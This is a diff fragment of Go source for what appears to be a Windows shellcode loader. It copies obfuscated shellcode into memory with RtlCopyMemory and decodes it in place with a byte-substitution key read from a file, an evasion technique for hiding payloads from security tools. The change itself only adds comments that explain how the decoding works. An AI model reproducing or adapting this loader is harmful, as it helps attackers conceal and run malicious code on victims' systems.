@@ -49,6 +49,7 @@ func main() {
 		os.Exit(1)
 	}
 
+	// Write the scrambled shellcode into memory
 	ntdll = windows.NewLazySystemDLL("ntdll.dll")
 	rtlcopymemory = ntdll.NewProc("RtlCopyMemory")
 	_, _, e = rtlcopymemory.Call(
@@ -58,12 +59,19 @@ func main() {
 	)
 	check(e)
 
+	// Get the key bytes from the key bin file
 	k, e = babble.NewKeyFromBytes(keyBytes, &babble.ByteMode{})
 	check(e)
 
+	// Loop through the scrambled shellcode in memory, and then
+	// substitute each byte with the correct byte from the key,
+	// all in place (in memory)
 	for i := 0; i < len(buf); i++ {
 		b := *(*byte)(unsafe.Pointer(addr + uintptr(i)))
-		b, _ = k.ByteFor(babble.NewByteToken(b))
+		// a byte token is just an interface, in this case it is
+		// just a byte. This is a simple substitution at the end of
+		// the day
+		b, _ = k.ByteFor(babble.NewByteToken(b)) 
 		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
 	}
 
